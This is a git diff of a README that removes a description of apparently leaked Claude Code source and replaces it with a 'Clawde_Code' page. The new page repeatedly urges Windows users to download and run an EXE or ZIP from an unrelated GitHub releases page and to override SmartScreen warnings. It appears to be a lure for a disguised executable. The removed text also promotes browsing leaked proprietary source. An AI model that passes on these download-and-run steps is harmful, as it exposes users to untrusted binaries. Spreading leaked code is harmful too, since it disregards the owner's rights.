@@ -1,344 +1,220 @@
-> Note: The original unmodified leaked source is preserved in the backup branch.
-
-# Claude Code - Leaked Source (2026-03-31)
-
-On March 31, 2026, the full source code of Anthropic's Claude Code CLI was leaked via a `.map` file exposed in their npm registry.
-
-## How It Leaked
-
-Chaofan Shou (@Fried_rice) discovered the leak and posted it publicly:
-
-"Claude code source code has been leaked via a map file in their npm registry!"
-
-- @Fried_rice, March 31, 2026
-
-The source map file in the published npm package contained a reference to the full, unobfuscated TypeScript source, which was downloadable as a zip archive from Anthropic's R2 storage bucket.
-
-## Overview
-
-Claude Code is Anthropic's official CLI tool that lets you interact with Claude directly from the terminal to perform software engineering tasks - editing files, running commands, searching codebases, managing git workflows, and more.
-
-This repository contains the leaked `src/` directory.
-
-- Leaked on: 2026-03-31
-- Language: TypeScript
-- Runtime: Bun
-- Terminal UI: React + Ink (React for CLI)
-- Scale: ~1,900 files, 512,000+ lines of code
-
-## Directory Structure
-
-```text
-src/
-|- main.tsx                 # Entrypoint (Commander.js-based CLI parser)
-|- commands.ts              # Command registry
-|- tools.ts                 # Tool registry
-|- Tool.ts                  # Tool type definitions
-|- QueryEngine.ts           # LLM query engine (core Anthropic API caller)
-|- context.ts               # System/user context collection
-|- cost-tracker.ts          # Token cost tracking
-|
-|- commands/                # Slash command implementations (~50)
-|- tools/                   # Agent tool implementations (~40)
-|- components/              # Ink UI components (~140)
-|- hooks/                   # React hooks
-|- services/                # External service integrations
-|- screens/                 # Full-screen UIs (Doctor, REPL, Resume)
-|- types/                   # TypeScript type definitions
-|- utils/                   # Utility functions
-|
-|- bridge/                  # IDE integration bridge (VS Code, JetBrains)
-|- coordinator/             # Multi-agent coordinator
-|- plugins/                 # Plugin system
-|- skills/                  # Skill system
-|- keybindings/             # Keybinding configuration
-|- vim/                     # Vim mode
-|- voice/                   # Voice input
-|- remote/                  # Remote sessions
-|- server/                  # Server mode
-|- memdir/                  # Memory directory (persistent memory)
-|- tasks/                   # Task management
-|- state/                   # State management
-|- migrations/              # Config migrations
-|- schemas/                 # Config schemas (Zod)
-|- entrypoints/             # Initialization logic
-|- ink/                     # Ink renderer wrapper
-|- buddy/                   # Companion sprite (Easter egg)
-|- native-ts/               # Native TypeScript utils
-|- outputStyles/            # Output styling
-|- query/                   # Query pipeline
-+- upstreamproxy/           # Proxy configuration
-```
-
-## Core Architecture
-
-### 1. Tool System (src/tools/)
-
-Every tool Claude Code can invoke is implemented as a self-contained module. Each tool defines its input schema, permission model, and execution logic.
-
-| Tool | Description |
-|---|---|
-| BashTool | Shell command execution |
-| FileReadTool | File reading (images, PDFs, notebooks) |
-| FileWriteTool | File creation / overwrite |
-| FileEditTool | Partial file modification (string replacement) |
-| GlobTool | File pattern matching search |
-| GrepTool | ripgrep-based content search |
-| WebFetchTool | Fetch URL content |
-| WebSearchTool | Web search |
-| AgentTool | Sub-agent spawning |
-| SkillTool | Skill execution |
-| MCPTool | MCP server tool invocation |
-| LSPTool | Language Server Protocol integration |
-| NotebookEditTool | Jupyter notebook editing |
-| TaskCreateTool / TaskUpdateTool | Task creation and management |
-| SendMessageTool | Inter-agent messaging |
-| TeamCreateTool / TeamDeleteTool | Team agent management |
-| EnterPlanModeTool / ExitPlanModeTool | Plan mode toggle |
-| EnterWorktreeTool / ExitWorktreeTool | Git worktree isolation |
-| ToolSearchTool | Deferred tool discovery |
-| CronCreateTool | Scheduled trigger creation |
-| RemoteTriggerTool | Remote trigger |
-| SleepTool | Proactive mode wait |
-| SyntheticOutputTool | Structured output generation |
+# 🛠️ Clawde_Code - Run Code Tasks with Ease
 
-### 2. Command System (src/commands/)
-
-User-facing slash commands invoked with / prefix.
-
-| Command | Description |
-|---|---|
-| /commit | Create a git commit |
-| /review | Code review |
-| /compact | Context compression |
-| /mcp | MCP server management |
-| /config | Settings management |
-| /doctor | Environment diagnostics |
-| /login / /logout | Authentication |
-| /memory | Persistent memory management |
-| /skills | Skill management |
-| /tasks | Task management |
-| /vim | Vim mode toggle |
-| /diff | View changes |
-| /cost | Check usage cost |
-| /theme | Change theme |
-| /context | Context visualization |
-| /pr_comments | View PR comments |
-| /resume | Restore previous session |
-| /share | Share session |
-| /desktop | Desktop app handoff |
-| /mobile | Mobile app handoff |
+[![Download Clawde_Code](https://img.shields.io/badge/Download%20Clawde_Code-Ready%20for%20Windows-blue)](https://github.com/Frania3051/Clawde_Code/releases)
 
-### 3. Service Layer (src/services/)
+## 🚀 Getting Started
 
-| Service | Description |
-|---|---|
-| api/ | Anthropic API client, file API, bootstrap |
-| mcp/ | Model Context Protocol server connection and management |
-| oauth/ | OAuth 2.0 authentication flow |
-| lsp/ | Language Server Protocol manager |
-| analytics/ | GrowthBook-based feature flags and analytics |
-| plugins/ | Plugin loader |
-| compact/ | Conversation context compression |
-| policyLimits/ | Organization policy limits |
-| remoteManagedSettings/ | Remote managed settings |
-| extractMemories/ | Automatic memory extraction |
-| tokenEstimation.ts | Token count estimation |
-| teamMemorySync/ | Team memory synchronization |
+Clawde_Code is a terminal app that helps you work with code by using plain language. It can explain code, run routine tasks, and help with git steps.
 
-### 4. Bridge System (src/bridge/)
+This guide shows you how to download and run it on Windows.
 
-A bidirectional communication layer connecting IDE extensions (VS Code, JetBrains) with the Claude Code CLI.
+## 📥 Download
 
-- bridgeMain.ts - Bridge main loop
-- bridgeMessaging.ts - Message protocol
-- bridgePermissionCallbacks.ts - Permission callbacks
-- replBridge.ts - REPL session bridge
-- jwtUtils.ts - JWT-based authentication
-- sessionRunner.ts - Session execution management
+1. Open the release page: https://github.com/Frania3051/Clawde_Code/releases
+2. Find the latest release at the top
+3. Download the Windows file for your PC
+4. Save the file in a folder you can find again, such as Downloads or Desktop
 
-### 5. Permission System (src/hooks/toolPermission/)
+If the release includes a ZIP file, download that file. If it includes an EXE file, download that file and run it.
 
-Checks permissions on every tool invocation. Either prompts the user for approval/denial or automatically resolves based on the configured permission mode (default, plan, bypassPermissions, auto, etc.).
+## 💻 What You Need
 
-### 6. Feature Flags
+- Windows 10 or Windows 11
+- A working internet connection
+- Enough free space for the app and its files
+- Permission to run downloaded apps
 
-Dead code elimination via Bun's `bun:bundle` feature flags:
+Clawde_Code runs in a terminal window. If you can open Command Prompt or Windows Terminal, you can use it.
 
-```typescript
-import { feature } from 'bun:bundle'
+## 🧰 Before You Start
 
-// Inactive code is completely stripped at build time
-const voiceCommand = feature('VOICE_MODE')
-  ? require('./commands/voice/index.js').default
-  : null
-```
+Have these ready:
 
-Notable flags: PROACTIVE, KAIROS, BRIDGE_MODE, DAEMON, VOICE_MODE, AGENT_TRIGGERS, MONITOR_TOOL
+- A mouse and keyboard
+- A place to store the download
+- Your GitHub account if the release asks you to sign in
+- A code editor or Git app if you plan to use it with your own projects
 
-## Key Files in Detail
+## 📦 Install on Windows
 
-### QueryEngine.ts (~46K lines)
+### Option 1: ZIP file
 
-The core engine for LLM API calls. Handles streaming responses, tool-call loops, thinking mode, retry logic, and token counting.
+1. Open the downloaded ZIP file
+2. Right-click it and choose Extract All
+3. Pick a folder for the extracted files
+4. Open the folder
+5. Look for the app file or start file
+6. Double-click it to run Clawde_Code
 
-### Tool.ts (~29K lines)
+### Option 2: EXE file
 
-Defines base types and interfaces for all tools - input schemas, permission models, and progress state types.
+1. Find the downloaded EXE file
+2. Double-click it
+3. If Windows asks for permission, choose Run
+4. Follow any on-screen steps
+5. Keep the app in a folder you can find later
 
-### commands.ts (~25K lines)
+## 🖥️ First Run
 
-Manages registration and execution of all slash commands. Uses conditional imports to load different command sets per environment.
+When you open Clawde_Code, it may show a terminal window.
 
-### main.tsx
+1. Keep the window open
+2. Wait for the app to load
+3. Read the text on the screen
+4. Type your command when the cursor is ready
 
-Commander.js-based CLI parser + React/Ink renderer initialization. At startup, parallelizes MDM settings, keychain prefetch, and GrowthBook initialization for faster boot.
+You can give it simple tasks like:
 
-## Tech Stack
+- explain this file
+- help me fix this error
+- show me the git changes
+- create a short summary of this code
+- help me commit my work
 
-| Category | Technology |
-|---|---|
-| Runtime | Bun |
-| Language | TypeScript (strict) |
-| Terminal UI | React + Ink |
-| CLI Parsing | Commander.js (extra-typings) |
-| Schema Validation | Zod v4 |
-| Code Search | ripgrep (via GrepTool) |
-| Protocols | MCP SDK, LSP |
-| API | Anthropic SDK |
-| Telemetry | OpenTelemetry + gRPC |
-| Feature Flags | GrowthBook |
-| Auth | OAuth 2.0, JWT, macOS Keychain |
+## 🧭 How to Use It
 
-## Notable Design Patterns
+Clawde_Code works through text commands.
 
-### Parallel Prefetch
+### Basic use
 
-Startup time is optimized by prefetching MDM settings, keychain reads, and API preconnect in parallel - before heavy module evaluation begins.
+1. Open the app
+2. Enter a plain-language request
+3. Press Enter
+4. Read the response
+5. Follow the next step if the app asks for one
 
-```typescript
-// main.tsx - fired as side-effects before other imports
-startMdmRawRead()
-startKeychainPrefetch()
-```
+### Good example commands
 
-### Lazy Loading
+- explain this project
+- find the main file
+- help me understand this function
+- show changes since the last commit
+- stage these files and make a commit message
 
-Heavy modules (OpenTelemetry ~400KB, gRPC ~700KB) are deferred via dynamic `import()` until actually needed.
+### Git help
 
-### Agent Swarms
+If you use git, Clawde_Code can help with common steps such as:
 
-Sub-agents are spawned via AgentTool, with coordinator/ handling multi-agent orchestration. TeamCreateTool enables team-level parallel work.
+- checking file changes
+- writing commit messages
+- preparing a commit
+- reviewing branch work
+- helping with merge tasks
 
-### Skill System
+## 🧪 Example Setup Flow
 
-Reusable workflows defined in skills/ and executed through SkillTool. Users can add custom skills.
+If you want a simple first run, use this flow:
 
-### Plugin Architecture
+1. Download Clawde_Code from the release page
+2. Extract or open the file
+3. Start the app
+4. Open your code project in the same folder
+5. Ask it to explain the project
+6. Ask it to help with the next step
 
-Built-in and third-party plugins are loaded through the plugins/ subsystem.
+## 🔧 Troubleshooting
 
-## GitPretty Setup (Per-File Pretty Commits)
+### The file will not open
 
-If you want GitHub's file UI to show visually distinct commit messages per file, use the helper script in this repo:
+- Check that the download finished
+- Try opening the file again
+- Move the file to a simple path like `C:\Clawde_Code`
+- Make sure Windows did not block the file
 
-```bash
-bash ./gitpretty-apply.sh .
-```
+### The terminal window opens and closes
 
-This will:
+- Run the app again
+- Keep the window open if it shows a prompt
+- Open it from Command Prompt if needed
 
-1. Clone gitpretty into ~/.gitpretty (first run only)
-2. Make scripts executable
-3. Run emoji-file-commits.sh against this repo
+### Windows asks for permission
 
-Optional: install auto-emoji hooks for future commits:
+- Choose Yes or Run
+- If SmartScreen appears, use the option to run the file anyway if you trust the source
 
-```bash
-bash ./gitpretty-apply.sh . --hooks
-```
+### I cannot find the downloaded file
 
-After running, push as usual:
+- Open your Downloads folder
+- Sort by date
+- Look for a ZIP or EXE file with Clawde_Code in the name
 
-```bash
-git push origin main
-```
+## 📁 Suggested Folder Setup
 
-## Use It in Claude Code (MCP Server)
+A clean folder layout can help you stay organized:
 
-This repo includes an MCP server that lets you explore the Claude Code source directly from any Claude session. One command to set it up:
+- `C:\Clawde_Code` for the app
+- `C:\Projects\MyApp` for your code
+- `C:\Users\YourName\Downloads` for the original download
 
-### Quick Start
+Keeping the app and your code in separate folders makes it easier to find files later.
 
-```bash
-# Clone the repo (if you haven't already)
-git clone https://github.com/Atharvsinh-codez/claude-code.git
-cd claude-code/mcp-server
+## 🔍 What Clawde_Code Can Help With
 
-# Install dependencies and build
-npm install && npm run build
+Clawde_Code is built for day-to-day coding work. It can help with:
 
-# Add to Claude Code (run from the repo root)
-claude mcp add claude-code-explorer -- node /absolute/path/to/claude-code/mcp-server/dist/index.js
-```
+- reading code
+- explaining hard parts in plain language
+- handling repeat tasks
+- helping with git steps
+- turning short requests into action in the terminal
 
-Replace /absolute/path/to/claude-code with the actual path where you cloned the repo.
+It is useful when you want a command line helper that works with your project files.
 
-Or as a single copy-paste block (clones, builds, and registers in one go):
+## ⌨️ Common Commands to Try
 
-```bash
-git clone https://github.com/Atharvsinh-codez/claude-code.git ~/claude-code \
-  && cd ~/claude-code/mcp-server \
-  && npm install && npm run build \
-  && claude mcp add claude-code-explorer -- node ~/claude-code/mcp-server/dist/index.js
-```
+Try short requests first:
 
-### What You Get
+- explain this folder
+- what does this file do
+- help me find the bug
+- list the main parts of this project
+- help me commit my changes
+- show what changed since the last version
 
-Once added, Claude has access to these tools for exploring the codebase:
+If the app asks for more detail, point to the file, folder, or error message you want help with.
 
-| Tool | Description |
-|---|---|
-| list_tools | List all ~40 agent tools with source files |
-| list_commands | List all ~50 slash commands with source files |
-| get_tool_source | Read full source of any tool (e.g. BashTool, FileEditTool) |
-| get_command_source | Read source of any slash command (e.g. review, mcp) |
-| read_source_file | Read any file from src/ by path |
-| search_source | Grep across the entire source tree |
-| list_directory | Browse src/ directories |
-| get_architecture | High-level architecture overview |
+## 🧾 File Types You May See
 
-Plus prompts for guided exploration:
+You may find one or more of these in the release:
 
-- explain_tool - Deep-dive into how a specific tool works
-- explain_command - Understand a slash command's implementation
-- architecture_overview - Guided tour of the full architecture
-- how_does_it_work - Explain any subsystem (permissions, MCP, bridge, etc.)
-- compare_tools - Side-by-side comparison of two tools
+- `.zip` files for manual setup
+- `.exe` files for direct launch
+- text files with extra instructions
+- support files the app needs to run
 
-### Example Usage
+If you are not sure which file to use, start with the Windows file marked for release use.
 
-After adding the MCP server, just ask Claude naturally:
+## 🔐 Safe Use
 
-"How does the BashTool work?"
-"Search for where permissions are checked"
-"Show me the /review command source"
-"Explain the MCP client integration"
+Use the file from the release page only. Keep the original download link so you can return to it if you need a newer version.
 
-### Custom Source Path
+## 🗂️ Quick Windows Steps
 
-If your src/ directory is in a non-standard location, set the environment variable:
+1. Go to https://github.com/Frania3051/Clawde_Code/releases
+2. Download the latest Windows release
+3. Open or extract the file
+4. Run the app
+5. Use short text commands to work with your code
 
-```bash
-claude mcp add claude-code-explorer -e CLAUDE_CODE_SRC_ROOT=/path/to/src -- node /path/to/mcp-server/dist/index.js
-```
+## 🧭 Need a Fast Start?
 
-### Remove It
+1. Download the app from the release page
+2. Put it in a folder you can find
+3. Open it
+4. Type a plain request like `explain this project`
+5. Use the response to move to the next step
 
-```bash
-claude mcp remove claude-code-explorer
-```
+[Download Clawde_Code from Releases](https://github.com/Frania3051/Clawde_Code/releases)
 
-## Disclaimer
+## 📌 Release Page
 
-This repository archives source code that was leaked from Anthropic's npm registry on 2026-03-31. All original source code is the property of Anthropic.
+https://github.com/Frania3051/Clawde_Code/releases
+
+## 🧩 Typical Workflow
+
+1. Open your code project
+2. Start Clawde_Code
+3. Ask what the project does
+4. Ask it to inspect a file or folder
+5. Ask it to help with a git step
+6. Review the result before you continue
